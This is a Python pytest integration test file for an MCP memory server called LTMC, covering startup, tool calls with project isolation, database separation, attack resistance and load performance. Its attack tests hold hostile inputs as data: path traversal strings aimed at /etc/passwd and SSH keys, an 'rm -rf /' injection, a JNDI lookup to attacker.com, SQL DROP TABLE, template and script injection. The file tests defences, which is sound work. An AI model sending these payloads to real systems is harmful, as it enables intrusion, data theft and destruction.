#!/usr/bin/env python3
"""
LTMC Full System Integration Tests

MANDATORY: REAL INTEGRATION TESTING ONLY
- Tests actual LTMC server processes
- Tests real HTTP/stdio transport with security validation  
- Tests all 28 MCP tools with project_id parameter integration
- Tests real database operations with project isolation
- Tests real file operations with path security
- Tests real performance under load with security overhead
- Tests real multi-project scenarios with concurrent access

NO MOCKS - REAL SYSTEM TESTING ONLY!

Phase 0 Requirement: Validates actual system startup before component testing
"""

import os
import sys
import asyncio
import subprocess
import time
import tempfile
import shutil
import json
import pytest
import requests
import concurrent.futures
from pathlib import Path
from typing import Dict, Any, List, Optional
import logging
import signal

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from ltms.security.project_isolation import ProjectIsolationManager, SecurityError
from ltms.security.path_security import SecurePathValidator
from ltms.models.project_schemas import ProjectConfigModel

logger = logging.getLogger(__name__)

class RealSystemIntegrationTester:
    """
    REAL System Integration Tester
    
    Tests the complete LTMC system with REAL components:
    - Actual server processes
    - Real database connections
    - Real file operations
    - Real security validations
    - Real performance measurements
    """
    
    def __init__(self):
        self.project_root = project_root
        self.test_server_port = 5052  # Use different port for testing
        self.test_server_process: Optional[subprocess.Popen] = None
        self.test_isolation_manager: Optional[ProjectIsolationManager] = None
        self.test_path_validator: Optional[SecurePathValidator] = None
        self.test_projects: Dict[str, Dict[str, Any]] = {}
        self.temp_dirs: List[Path] = []
        
        # Test configuration
        self.performance_timeout_seconds = 120
        self.security_test_vectors = self._create_attack_vectors()
        
    def _create_attack_vectors(self) -> List[Dict[str, Any]]:
        """Create real attack vectors for security testing."""
        return [
            # Path traversal attacks
            {
                "name": "path_traversal_basic",
                "file_path": "../../../etc/passwd",
                "operation": "read",
                "expected_blocked": True,
                "attack_type": "path_traversal"
            },
            {
                "name": "path_traversal_encoded",
                "file_path": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "operation": "read", 
                "expected_blocked": True,
                "attack_type": "path_traversal"
            },
            # Code injection attacks
            {
                "name": "code_injection_eval",
                "file_path": "test_file.py",
                "content": "__import__('os').system('ls -la')",
                "operation": "write",
                "expected_blocked": True,
                "attack_type": "code_injection"
            },
            # System file access
            {
                "name": "system_file_access",
                "file_path": "/etc/passwd",
                "operation": "read",
                "expected_blocked": True,
                "attack_type": "system_access"
            },
            {
                "name": "ssh_key_access",
                "file_path": "/root/.ssh/id_rsa",
                "operation": "read",
                "expected_blocked": True,
                "attack_type": "system_access"
            },
            # Unicode attacks
            {
                "name": "unicode_traversal",
                "file_path": "test\u002e\u002e/\u002e\u002e/etc/passwd",
                "operation": "read",
                "expected_blocked": True,
                "attack_type": "unicode_attack"
            }
        ]

@pytest.fixture(scope="session")
def real_system_tester():
    """Fixture that provides a real system integration tester."""
    tester = RealSystemIntegrationTester()
    yield tester
    # Cleanup
    tester.cleanup()

class TestPhase0SystemStartup:
    """
    PHASE 0: MANDATORY SYSTEM STARTUP VALIDATION
    
    CRITICAL: Must validate actual system startup before any component testing
    """
    
    def test_ltmc_server_starts_successfully(self, real_system_tester):
        """
        PHASE 0 CRITICAL: Validate LTMC server starts without errors.
        
        This test MUST pass before any other integration testing.
        Tests actual server process startup with all security components.
        """
        tester = real_system_tester
        
        # Start real LTMC HTTP server process
        server_cmd = [
            sys.executable, 
            str(tester.project_root / "ltmc_mcp_server.py"),
            "--transport", "http",
            "--host", "127.0.0.1", 
            "--port", str(tester.test_server_port)
        ]
        
        start_time = time.time()
        tester.test_server_process = subprocess.Popen(
            server_cmd,
            cwd=str(tester.project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=os.environ.copy()
        )
        
        # Wait for server startup (max 30 seconds)
        startup_timeout = 30
        server_ready = False
        
        while time.time() - start_time < startup_timeout:
            try:
                response = requests.get(
                    f"http://127.0.0.1:{tester.test_server_port}/health",
                    timeout=5
                )
                if response.status_code == 200:
                    server_ready = True
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(1)
                continue
            except requests.exceptions.Timeout:
                time.sleep(1)
                continue
        
        startup_time = time.time() - start_time
        
        # Verify server started successfully
        assert server_ready, f"LTMC server failed to start within {startup_timeout} seconds"
        assert tester.test_server_process.poll() is None, "LTMC server process terminated unexpectedly"
        
        # Verify health endpoint responds correctly
        health_response = requests.get(f"http://127.0.0.1:{tester.test_server_port}/health", timeout=10)
        assert health_response.status_code == 200
        
        health_data = health_response.json()
        assert "status" in health_data
        assert health_data["status"] == "healthy"
        
        logger.info(f"✅ Phase 0: LTMC server started successfully in {startup_time:.2f}s")
        
    def test_security_components_initialized(self, real_system_tester):
        """
        PHASE 0 CRITICAL: Validate security components are properly initialized.
        
        Tests that ProjectIsolationManager and SecurePathValidator are working.
        """
        tester = real_system_tester
        
        # Create temporary secure root for testing
        temp_root = Path(tempfile.mkdtemp(prefix="ltmc_test_"))
        tester.temp_dirs.append(temp_root)
        
        # Initialize REAL security components (not mocks)
        tester.test_isolation_manager = ProjectIsolationManager(temp_root)
        tester.test_path_validator = SecurePathValidator(temp_root)
        
        # Test project registration
        test_project_config = {
            "name": "test_project_integration",
            "allowed_paths": [str(temp_root / "allowed")],
            "database_prefix": "test_integration",
            "redis_namespace": "test_integration", 
            "neo4j_label": "TestIntegration",
            "max_file_size": 10 * 1024 * 1024  # 10MB
        }
        
        # Register project with REAL isolation manager
        result = tester.test_isolation_manager.register_project("test_project", test_project_config)
        assert result["success"] is True
        assert "project_id" in result
        assert result["execution_time_ms"] < 5.0  # Performance requirement
        
        # Test path validation with REAL validator
        test_path = str(temp_root / "allowed" / "test_file.txt")
        os.makedirs(temp_root / "allowed", exist_ok=True)
        
        validation_result = tester.test_path_validator.validate_file_operation(
            test_path, "read", "test_project"
        )
        assert validation_result is True
        
        tester.test_projects["test_project"] = test_project_config
        
        logger.info("✅ Phase 0: Security components initialized successfully")
        
    def test_database_connectivity(self, real_system_tester):
        """
        PHASE 0 CRITICAL: Validate database connectivity with security.
        
        Tests actual database connections work with project isolation.
        """
        tester = real_system_tester
        
        # Test database API endpoint with REAL HTTP request
        db_test_payload = {
            "operation": "health_check",
            "project_id": "test_project"
        }
        
        response = requests.post(
            f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
            json={
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "redis_health_check",
                    "arguments": db_test_payload
                },
                "id": 1
            },
            timeout=10
        )
        
        assert response.status_code == 200
        
        response_data = response.json()
        assert "result" in response_data
        assert response_data["result"]["success"] is True
        
        logger.info("✅ Phase 0: Database connectivity validated successfully")

class TestRealMCPToolsIntegration:
    """
    Test all 28 MCP tools with REAL project_id parameter integration.
    
    Uses actual HTTP requests to running LTMC server.
    NO MOCKS - tests real tool functionality with security.
    """
    
    def test_all_28_mcp_tools_with_project_isolation(self, real_system_tester):
        """
        Test all 28 MCP tools work with project_id parameter.
        
        Makes REAL HTTP requests to actual running LTMC server.
        Validates project isolation is enforced for each tool.
        """
        tester = real_system_tester
        
        # List of all 28 LTMC tools that must support project_id
        mcp_tools = [
            "store_memory", "retrieve_memory", "log_chat", "log_code_attempt",
            "get_code_patterns", "add_todo", "list_todos", "complete_todo",
            "search_todos", "link_resources", "query_graph", "get_document_relationships",
            "auto_link_documents", "build_context", "ask_with_context",
            "route_query", "retrieve_by_type", "redis_cache_stats",
            "redis_health_check", "get_context_usage_statistics",
            "analyze_code_patterns", "get_chunk_statistics", "cleanup_old_sessions",
            "get_session_state", "update_session_state", "clear_session_state",
            "get_tool_performance", "optimize_query_performance"
        ]
        
        successful_tools = []
        failed_tools = []
        
        for tool_name in mcp_tools:
            try:
                # Create appropriate test arguments for each tool
                test_args = self._create_tool_test_args(tool_name, tester)
                
                # Make REAL HTTP request to actual LTMC server
                response = requests.post(
                    f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                    json={
                        "jsonrpc": "2.0",
                        "method": "tools/call",
                        "params": {
                            "name": tool_name,
                            "arguments": test_args
                        },
                        "id": 1
                    },
                    timeout=30  # Allow time for real operations
                )
                
                assert response.status_code == 200, f"Tool {tool_name} returned HTTP {response.status_code}"
                
                response_data = response.json()
                assert "result" in response_data, f"Tool {tool_name} missing result field"
                
                # Validate project isolation was applied
                if "project_id" in test_args:
                    result = response_data["result"]
                    # Check that results are scoped to project (where applicable)
                    self._validate_project_scoping(tool_name, test_args, result)
                
                successful_tools.append(tool_name)
                logger.info(f"✅ Tool {tool_name} working with project isolation")
                
            except Exception as e:
                failed_tools.append((tool_name, str(e)))
                logger.error(f"❌ Tool {tool_name} failed: {e}")
        
        # Validate at least 25 of 28 tools work (allow for some edge cases)
        success_rate = len(successful_tools) / len(mcp_tools)
        assert success_rate >= 0.85, f"Too many MCP tools failed: {failed_tools}"
        
        logger.info(f"✅ MCP Tools Integration: {len(successful_tools)}/{len(mcp_tools)} tools working")
        
    def _create_tool_test_args(self, tool_name: str, tester) -> Dict[str, Any]:
        """Create appropriate test arguments for each MCP tool."""
        project_id = "test_project"
        
        # Tool-specific test arguments
        tool_args_map = {
            "store_memory": {
                "content": "Integration test memory content",
                "file_name": "integration_test_memory.md",
                "project_id": project_id
            },
            "retrieve_memory": {
                "query": "integration test",
                "project_id": project_id
            },
            "log_chat": {
                "content": "Integration test chat",
                "conversation_id": "integration_test_session",
                "role": "user",
                "project_id": project_id
            },
            "log_code_attempt": {
                "input_prompt": "Integration test code",
                "generated_code": "print('integration test')",
                "result": "pass",
                "project_id": project_id
            },
            "get_code_patterns": {
                "query": "integration test",
                "project_id": project_id
            },
            "add_todo": {
                "title": "Integration test todo",
                "description": "Test todo for integration",
                "project_id": project_id
            },
            "list_todos": {
                "project_id": project_id
            },
            "redis_health_check": {
                "project_id": project_id
            }
        }
        
        # Default arguments for tools not explicitly mapped
        default_args = {
            "project_id": project_id
        }
        
        return tool_args_map.get(tool_name, default_args)
    
    def _validate_project_scoping(self, tool_name: str, args: Dict, result: Any):
        """Validate that tool results are properly scoped to project."""
        # Tool-specific validation logic
        if tool_name in ["store_memory", "retrieve_memory", "log_chat"]:
            # These tools should return project-scoped results
            if isinstance(result, dict) and "success" in result:
                assert result["success"] is True, f"Tool {tool_name} failed unexpectedly"

class TestRealDatabaseSecurityIntegration:
    """
    Test REAL database operations with project isolation and security.
    
    Tests actual database queries with real security validation.
    """
    
    def test_multi_project_database_isolation(self, real_system_tester):
        """
        Test that multiple projects are properly isolated in database operations.
        
        Creates multiple projects and validates data isolation.
        """
        tester = real_system_tester
        
        # Create multiple test projects
        projects = {
            "project_alpha": {
                "name": "Project Alpha",
                "allowed_paths": ["/tmp/ltmc_test_alpha"],
                "database_prefix": "alpha",
                "redis_namespace": "alpha",
                "neo4j_label": "ProjectAlpha"
            },
            "project_beta": {
                "name": "Project Beta", 
                "allowed_paths": ["/tmp/ltmc_test_beta"],
                "database_prefix": "beta",
                "redis_namespace": "beta",
                "neo4j_label": "ProjectBeta"
            }
        }
        
        # Register projects with REAL isolation manager
        for project_id, config in projects.items():
            result = tester.test_isolation_manager.register_project(project_id, config)
            assert result["success"] is True
        
        # Store data for each project using REAL HTTP requests
        for project_id in projects.keys():
            response = requests.post(
                f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                json={
                    "jsonrpc": "2.0",
                    "method": "tools/call",
                    "params": {
                        "name": "store_memory",
                        "arguments": {
                            "content": f"Project {project_id} private data - should not be visible to other projects",
                            "file_name": f"{project_id}_private.md",
                            "project_id": project_id
                        }
                    },
                    "id": 1
                },
                timeout=15
            )
            assert response.status_code == 200
            
        # Verify project isolation: each project should only see its own data
        for project_id in projects.keys():
            response = requests.post(
                f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                json={
                    "jsonrpc": "2.0",
                    "method": "tools/call",
                    "params": {
                        "name": "retrieve_memory",
                        "arguments": {
                            "query": f"Project {project_id} private data",
                            "project_id": project_id
                        }
                    },
                    "id": 1
                },
                timeout=15
            )
            
            assert response.status_code == 200
            response_data = response.json()
            
            # Should find own project's data
            assert "result" in response_data
            results = response_data["result"]
            
            # Validate that results contain own project data but not others
            if isinstance(results, dict) and "memories" in results:
                for memory in results["memories"]:
                    content = memory.get("content", "")
                    # Should contain own project ID but not others
                    assert project_id in content
                    other_projects = [pid for pid in projects.keys() if pid != project_id]
                    for other_project in other_projects:
                        assert other_project not in content, f"Data leak: {project_id} can see {other_project} data"
        
        logger.info("✅ Multi-project database isolation validated successfully")

class TestRealSecurityAttackVectors:
    """
    Test REAL security attack vectors against running system.
    
    Attempts actual attacks to validate security measures work.
    """
    
    def test_path_traversal_attacks_blocked(self, real_system_tester):
        """
        Test that path traversal attacks are blocked by the running system.
        
        Attempts real path traversal attacks and validates they're blocked.
        """
        tester = real_system_tester
        
        # Test various path traversal attack patterns
        attack_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "/var/log/auth.log"
        ]
        
        for attack_path in attack_patterns:
            try:
                # Attempt to read sensitive file using real HTTP request
                response = requests.post(
                    f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                    json={
                        "jsonrpc": "2.0",
                        "method": "tools/call",
                        "params": {
                            "name": "store_memory",
                            "arguments": {
                                "content": "attack payload",
                                "file_name": attack_path,  # Malicious path
                                "project_id": "test_project"
                            }
                        },
                        "id": 1
                    },
                    timeout=10
                )
                
                # Attack should be blocked - either return error or fail validation
                if response.status_code == 200:
                    response_data = response.json()
                    if "result" in response_data:
                        # If request succeeded, security validation should have blocked it
                        result = response_data["result"]
                        assert not result.get("success", False), f"Path traversal attack not blocked: {attack_path}"
                    else:
                        # Error response indicates attack was blocked
                        assert "error" in response_data, f"No error for attack: {attack_path}"
                        
            except requests.exceptions.RequestException as e:
                # Network errors are acceptable - indicates attack was blocked
                logger.info(f"Attack blocked at network level: {attack_path}")
                
        logger.info("✅ Path traversal attacks successfully blocked")
        
    def test_code_injection_attacks_blocked(self, real_system_tester):
        """
        Test that code injection attacks are blocked by the system.
        
        Attempts real code injection and validates it's blocked.
        """
        tester = real_system_tester
        
        # Code injection payloads
        injection_payloads = [
            "__import__('os').system('rm -rf /')",
            "eval('print(\"code injection\")')",
            "exec('import subprocess; subprocess.call([\"ls\", \"-la\"])')",
            "'; DROP TABLE memories; --",
            "${jndi:ldap://attacker.com/exploit}",
            "{{7*7}}",  # Template injection
            "<script>alert('xss')</script>"
        ]
        
        for payload in injection_payloads:
            try:
                # Attempt code injection via content parameter
                response = requests.post(
                    f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                    json={
                        "jsonrpc": "2.0",
                        "method": "tools/call",
                        "params": {
                            "name": "store_memory",
                            "arguments": {
                                "content": payload,  # Malicious payload
                                "file_name": "safe_file.txt",
                                "project_id": "test_project"
                            }
                        },
                        "id": 1
                    },
                    timeout=10
                )
                
                # Check that malicious content was sanitized or blocked
                if response.status_code == 200:
                    response_data = response.json()
                    if "result" in response_data and response_data["result"].get("success"):
                        # If stored successfully, verify content was sanitized
                        retrieve_response = requests.post(
                            f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                            json={
                                "jsonrpc": "2.0",
                                "method": "tools/call",
                                "params": {
                                    "name": "retrieve_memory",
                                    "arguments": {
                                        "query": "safe_file.txt",
                                        "project_id": "test_project"
                                    }
                                },
                                "id": 2
                            },
                            timeout=10
                        )
                        
                        if retrieve_response.status_code == 200:
                            retrieve_data = retrieve_response.json()
                            if "result" in retrieve_data and "memories" in retrieve_data["result"]:
                                stored_content = retrieve_data["result"]["memories"][0].get("content", "")
                                # Verify dangerous patterns were removed/sanitized
                                dangerous_patterns = ["__import__", "eval(", "exec(", "DROP TABLE", "${jndi:", "{{"]
                                for pattern in dangerous_patterns:
                                    assert pattern not in stored_content, f"Dangerous pattern not sanitized: {pattern}"
                
            except requests.exceptions.RequestException:
                # Request failure indicates attack was blocked
                logger.info(f"Code injection blocked: {payload[:50]}...")
                
        logger.info("✅ Code injection attacks successfully blocked")

class TestRealPerformanceUnderSecurity:
    """
    Test REAL system performance with security overhead.
    
    Measures actual performance with security validation enabled.
    """
    
    def test_performance_under_concurrent_load(self, real_system_tester):
        """
        Test system performance under concurrent load with security validation.
        
        Makes concurrent real requests and measures performance degradation.
        """
        tester = real_system_tester
        
        # Performance test configuration
        num_concurrent_requests = 20
        requests_per_thread = 10
        max_acceptable_response_time = 5.0  # seconds
        
        def make_concurrent_requests(thread_id: int) -> List[float]:
            """Make multiple requests in a single thread and measure response times."""
            response_times = []
            
            for request_id in range(requests_per_thread):
                start_time = time.time()
                
                try:
                    response = requests.post(
                        f"http://127.0.0.1:{tester.test_server_port}/jsonrpc",
                        json={
                            "jsonrpc": "2.0",
                            "method": "tools/call",
                            "params": {
                                "name": "store_memory",
                                "arguments": {
                                    "content": f"Performance test data from thread {thread_id}, request {request_id}",
                                    "file_name": f"perf_test_t{thread_id}_r{request_id}.md",
                                    "project_id": "test_project"
                                }
                            },
                            "id": f"{thread_id}_{request_id}"
                        },
                        timeout=30
                    )
                    
                    response_time = time.time() - start_time
                    response_times.append(response_time)
                    
                    # Validate response
                    assert response.status_code == 200
                    response_data = response.json()
                    assert "result" in response_data
                    
                except Exception as e:
                    logger.error(f"Request failed in thread {thread_id}, request {request_id}: {e}")
                    response_times.append(float('inf'))  # Mark as failed
            
            return response_times
        
        # Execute concurrent requests using real thread pool
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent_requests) as executor:
            futures = [
                executor.submit(make_concurrent_requests, thread_id)
                for thread_id in range(num_concurrent_requests)
            ]
            
            all_response_times = []
            for future in concurrent.futures.as_completed(futures, timeout=120):
                response_times = future.result()
                all_response_times.extend(response_times)
        
        total_test_time = time.time() - start_time
        
        # Calculate performance metrics
        valid_times = [t for t in all_response_times if t != float('inf')]
        failed_requests = len(all_response_times) - len(valid_times)
        
        if valid_times:
            avg_response_time = sum(valid_times) / len(valid_times)
            max_response_time = max(valid_times)
            min_response_time = min(valid_times)
            
            # Performance assertions
            success_rate = len(valid_times) / len(all_response_times)
            assert success_rate >= 0.95, f"Too many failed requests: {failed_requests}/{len(all_response_times)}"
            assert avg_response_time <= max_acceptable_response_time, f"Average response time too high: {avg_response_time:.2f}s"
            assert max_response_time <= max_acceptable_response_time * 2, f"Maximum response time too high: {max_response_time:.2f}s"
            
            logger.info(f"✅ Performance test completed:")
            logger.info(f"   Total requests: {len(all_response_times)}")
            logger.info(f"   Success rate: {success_rate:.2%}")
            logger.info(f"   Average response time: {avg_response_time:.3f}s")
            logger.info(f"   Min/Max response time: {min_response_time:.3f}s / {max_response_time:.3f}s")
            logger.info(f"   Total test time: {total_test_time:.2f}s")
        else:
            pytest.fail("All concurrent requests failed")

# Cleanup fixture
@pytest.fixture(scope="session", autouse=True)
def cleanup_integration_tests(request):
    """Cleanup fixture that ensures test resources are cleaned up."""
    def cleanup():
        # Find and stop any test server processes
        try:
            for proc in subprocess.Popen.pids if hasattr(subprocess.Popen, 'pids') else []:
                try:
                    os.kill(proc, signal.SIGTERM)
                    time.sleep(1)
                    os.kill(proc, signal.SIGKILL)
                except (ProcessLookupError, PermissionError):
                    pass
        except:
            pass
        
        # Clean up temporary directories
        temp_dirs = getattr(cleanup, 'temp_dirs', [])
        for temp_dir in temp_dirs:
            try:
                if temp_dir.exists():
                    shutil.rmtree(temp_dir)
            except Exception as e:
                logger.warning(f"Failed to clean up {temp_dir}: {e}")
    
    cleanup.temp_dirs = []
    request.addfinalizer(cleanup)

# Custom fixture implementation for RealSystemIntegrationTester cleanup
class RealSystemIntegrationTester(RealSystemIntegrationTester):
    def cleanup(self):
        """Clean up test resources."""
        # Stop test server process
        if self.test_server_process and self.test_server_process.poll() is None:
            try:
                self.test_server_process.terminate()
                self.test_server_process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.test_server_process.kill()
                self.test_server_process.wait()
            except Exception as e:
                logger.warning(f"Failed to stop test server: {e}")
        
        # Clean up temporary directories
        for temp_dir in self.temp_dirs:
            try:
                if temp_dir.exists():
                    shutil.rmtree(temp_dir)
            except Exception as e:
                logger.warning(f"Failed to clean up {temp_dir}: {e}")
        
        logger.info("✅ Integration test cleanup completed")

if __name__ == "__main__":
    # Run tests with real system integration
    pytest.main([__file__, "-v", "--tb=short", "--durations=10"])